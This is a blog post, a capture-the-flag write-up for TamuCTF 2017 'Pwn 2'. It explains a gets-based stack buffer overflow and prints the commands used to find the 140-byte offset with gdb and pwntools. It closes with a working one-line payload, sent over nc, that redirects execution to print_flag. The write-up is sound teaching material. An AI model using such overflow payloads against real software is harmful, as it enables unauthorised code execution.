<!DOCTYPE html>
<html>
<head>
    <meta name="generator" content="Hugo 0.26-DEV" />

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="My thoughts and rambles">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    
    <link rel="icon" type="image/png" href="/images/favicon.ico">

    
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" sizes="192x192" href="/images/touch/chrome-touch-icon-192x192.png">

    
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="Material Design Lite">
    <link rel="apple-touch-icon-precomposed" href="apple-touch-icon-precomposed.png">

    
    <meta name="msapplication-TileImage" content="images/touch/ms-touch-icon-144x144-precomposed.png">
    <meta name="msapplication-TileColor" content="#3372DF">

    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en"/>
    <link rel="stylesheet" href="/css/ionicons.min.css"/>
    <link rel="stylesheet" href="https://storage.googleapis.com/code.getmdl.io/1.1.3/material.grey-orange.min.css"/>
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="/css/hmdl-style.css"/>



    <title>TamuCTF 2017 - Pwn 2</title>
</head>

<body style="background-image: url('/images/background.jpg');">
    <div id="MainCnt" class="hmdl-body mdl-layout mdl-js-layout has-drawer is-upgraded">        
        <header class="mdl-layout__header mdl-layout__header--transparent mdl-layout__header--scroll">
            <div class="mdl-layout__header-row">
                <div class="mdl-layout-spacer"></div>
                <nav class="mdl-navigation">
                <a class="mdl-navigation__link" href="/">Home</a>
                <a class="mdl-navigation__link" href="/post/">Articles</a>
                <a class="mdl-navigation__link" href="/project/">Projects</a>
                <a class="mdl-navigation__link" href="/about/">About</a>
                </nav>
            </div>
        </header>
        <div class="mdl-layout__drawer">
            <nav class="mdl-navigation">
            <a class="mdl-navigation__link" href="/">Home</a>
            <a class="mdl-navigation__link" href="/post/">Articles</a>
            <a class="mdl-navigation__link" href="/project/">Projects</a>
            <a class="mdl-navigation__link" href="/about/">About</a>
            </nav>
        </div>

        <main class="mdl-layout__content">

		

            <div class="hmdl-page mdl-grid">
                <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
                    <div class="mdl-card__media mdl-color-text--grey-50" style=" background-color:white;">
                        <h3 style="color:orange;">TamuCTF 2017 - Pwn 2</h3>
                    </div>
                    <div class="hmdl-page-meta mdl-color-text--grey-700 mdl-card__supporting-text">
                        <div class="minilogo" style="background-image: url('/images/avatar-64x64.png');"></div>

                        <div>
							<strong>
                            		<strong>Tzaoh</strong>
							</strong>
                            <span>May 28, 2017</span>
                        </div>
                        <div class="section-spacer"></div>
                    </div>
                    <div class="hmdl-page-content mdl-color-text--grey-700 mdl-card__supporting-text">
                        

<p><img src="/assets/1-pwn2_description.png" alt="Pwn2 challenge description" /></p>

<p>We are given a source code file and a binary which is being run remotely.
Let&rsquo;s a analyze it with radare2:</p>
<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ wget https://ctf.tamu.edu/files/dacdf9d7951deede662f1b89e4ec2a90/pwn2
$ r2 pwn2
<span style="color: #f92672">[</span>0x08048450<span style="color: #f92672">]</span>&gt; aaa		<span style="color: #75715e"># Analyze</span>
<span style="color: #f92672">[</span>0x08048450<span style="color: #f92672">]</span>&gt; afl		<span style="color: #75715e"># List functions found</span>
.
.
0x0804854b    <span style="color: #ae81ff">4</span> <span style="color: #ae81ff">103</span>          sym.print_flag
0x080485b2    <span style="color: #ae81ff">1</span> <span style="color: #ae81ff">84</span>           sym.echo
0x08048606    <span style="color: #ae81ff">1</span> <span style="color: #ae81ff">36</span>           sym.main
.
.
</pre></div>

<p>We can see similar functions to the previous pwning challenge, but there a complication here: if we look closely&hellip;</p>
<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span><span style="color: #f92672">[</span>0x080485c0<span style="color: #f92672">]</span>&gt; s sym.print_flag 
<span style="color: #f92672">[</span>0x0804854b<span style="color: #f92672">]</span>&gt; axt
<span style="color: #f92672">[</span>0x0804854b<span style="color: #f92672">]</span>&gt;
</pre></div>

<p>We realize that <strong>print_flag</strong> function, which is responsible for printing the flag stored in <strong>flag.txt</strong>, is never called!<br />
Instead a new function named <strong>echo</strong> is called from <strong>main</strong> function.</p>

<p><img src="/assets/2-pwn2_call_echo_in_main.png" alt="Pwn2 call in main function" /></p>

<p>Lets see what it does:</p>
<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ pdf @ sym.echo
</pre></div>

<p><img src="/assets/3-pwn2_echo_function.png" alt="Pwn2 echo function content" /></p>

<p>Ok, so aparently it just prints back whatever you input before. But hey! To read your input it uses <code>gets</code> insecure function again!  That means we can write beyond the allocated memory for our input.
&gt; &ldquo;All right, but this case is not like the previous one! (<a href="../pwn1/pwn1.md">pwn1 challenge</a>).<br />
&gt; We do not want to change the value of a variable, but to call an existent function!&rdquo;
&gt; Is it possible?</p>

<p>Hell yeah! but to know how, we first need to understand how the stack is affected when calling a function (echo in this case).<br />
When a function is going to be called, some data is going to be pushed into the stack. Among other things one of the stuff is stored is the EIP register.</p>

<blockquote>
<p>&ldquo;Why this register? Why is it special?&rdquo;</p>
</blockquote>

<p>The purpose of EIP register (or instruction pointer) is to indicate the CPU which instruction has to be executed after the current one. When the <strong>echo</strong> function will finish the CPU will need to continue the execution right after the call.<br />
Like this:</p>

<p><img src="/assets/4-pwn2_normal_flow.png" alt="Pwn2 Normal execution flow" /></p>

<p>And the stack will look like:</p>

<p><img src="/assets/5-pwn2_stack_view.png" alt="Pwn2 Stack view on echo call" /></p>

<p>Nice :v:!, looking at the stack we realize we could just write a bunch of bytes until we reach the <strong>Saved EIP</strong> value!</p>

<blockquote>
<p>Okay but &hellip; how many bytes do we have to write?</p>
</blockquote>

<p>Well, in this case we can calculate like <code>0x88h + 4d (ESP length) = 140d</code>, but I&rsquo;ll calculate another way too.<br />
Lets use gdb (GNU Debugger).</p>
<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;A&quot;*500)&#39;</span> &gt; input.txt    <span style="color: #75715e"># We generate a long string and save it in a text file.</span>
$ gdb pwn2                                  <span style="color: #75715e"># We open the binary with gdb.</span>
<span style="color: #f92672">(</span>gdb<span style="color: #f92672">)</span> run &lt; input.txt                       <span style="color: #75715e"># Run the binary with the content of input.txt as input.</span>
</pre></div>

<p><img src="/assets/6-pwn2_gdb.png" alt="Pwn2 GDB executing pwn2" /></p>

<p>We ran the binary with gdb and passed 500 &ldquo;A&rdquo;s as input.
That <code>0x41414141</code> means that we have overwritten EIP register with value &ldquo;AAAA&rdquo; and the process crashed when it tried to execute the instrucction of that address (obviously there is nothing there).</p>

<p>So now we could just create a custom string like &ldquo;ABCDEF&hellip;.&rdquo; to figure out which part of the string is being used to overwrite the EIP &hellip; OR we can use a script which generates it for us :grin:.</p>

<p>Now is when it comes the <strong>pwntools</strong> for python (to install just do <code>$ pip install pwntools</code>) and more specifically its
<strong>cyclic</strong> utility. <strong>Cyclic</strong> is able to generate a sequence of unique substrings of any length (4 by default).</p>

<p>Lets try it!</p>
<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ pwn cyclic <span style="color: #ae81ff">500</span> &gt; input.txt  <span style="color: #75715e"># Generate a string of 500 chars with unique substrings of 4 characters.</span>
$ gdb pwn2
<span style="color: #f92672">(</span>gdb<span style="color: #f92672">)</span> run &lt; input.txt
</pre></div>

<p><img src="/assets/7-pwn2_gdb_cyclic.png" alt="Pwn2 GDB Executing pwn2" /></p>

<p>To check that value we do:</p>
<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ pwn cyclic -l 0x6261616b
<span style="color: #ae81ff">140</span>
</pre></div>

<p>And finally, after 140 Characters we write a new address to continue the execution. Which address? the address of the <strong>print_flag</strong> function, of course! The new execution flow will look like this:</p>

<p><img src="/assets/8-pwn2_modified_flow.png" alt="Pwn2 Modified execution flow" /></p>

<p>Lets get our flag:</p>
<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;A&quot;*140 + &quot;\x4b\x85\x04\x08&quot;)&#39;</span> <span style="color: #f8f8f2">|</span> nc pwn.ctf.tamu.edu <span style="color: #ae81ff">4321</span> 
Enter a word to be echoed:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK�
This <span style="color: #66d9ef">function</span> has been deprecated
gigem<span style="color: #f92672">{</span>D34D_FUNC_R1S1NG<span style="color: #f92672">}</span>
</pre></div>

<p>Answer: gigem{D34D_FUNC_R1S1NG}</p>

<h3 id="complete-video">Complete video</h3>

<p><a href="https://asciinema.org/a/e8oyx42bm4nbs5stm33o4x24s?autoplay=1"><img src="https://asciinema.org/a/e8oyx42bm4nbs5stm33o4x24s.png" width="400"/></a></p>

<h3 id="tools-used">Tools used:</h3>

<ul>
<li><a href="https://github.com/radare/radare2">radare2</a> - To analyze the binary.</li>
<li><a href="https://www.gnu.org/software/gdb/">gdb</a> - For binary debugging.</li>
<li><a href="https://github.com/Gallopsled/pwntools">pwntools</a> and <a href="http://docs.pwntools.com/en/stable/util/cyclic.html#pwnlib.util.cyclic.cyclic">cyclic</a> - To generate unique substrings.</li>
<li><a href="https://www.draw.io/">draw.io</a> - To draw some graphics.</li>
<li><a href="https://asciinema.org">asciinema</a> - To record the session.</li>
</ul>

                    </div>
                    <div class="hmdl-page-comments mdl-color-text--primary-contrast mdl-card__supporting-text comments"> 
                        <strong>
                            	<strong>Tzaoh</strong>
						</strong>
                        <p></p>
                    </div>  
                </div>                
                <nav class="mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
                    <a href="/post/tamuctf2017/pwn1/">
                        <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                        <i class="icon ion-android-arrow-back"></i>
                        </button>
                        Older
                    </a>
                    <div class="section-spacer"></div>
                    <a href="/post/tamuctf2017/pwn4/">
                        Newer
                        <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                            <i class="icon ion-android-arrow-forward"></i>
                        </button>
                    </a>
                </nav>
 
            </div>        
        </main>
        <footer class="mdl-mini-footer">
            <div class="mdl-mini-footer--left-section">                
                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="mailto:Firstname@example.com?subject=Hi">
                    <i class="material-icons_lg icon ion-email"></i>
                    <span class="visuallyhidden">Email</span>
                </a>
                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="https://github.com/BlackHoods">
                    <i class="material-icons_lg icon ion-social-github"></i>
                    <span class="visuallyhidden">Github</span>
                </a>
                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="https://twitter.com/firstname_lastname">
                    <i class="material-icons_lg icon ion-social-twitter "></i>
                    <span class="visuallyhidden">Twitter</span>
                </a>


            </div>
            <div class="mdl-mini-footer--right-section">
                <span>© 2017 </span>
            </div>
        </footer>
        <div class="mdl-layout__obfuscator"></div>
    </div>
    <script src="https://code.getmdl.io/1.1.3/material.min.js"></script>


</body>
</html>

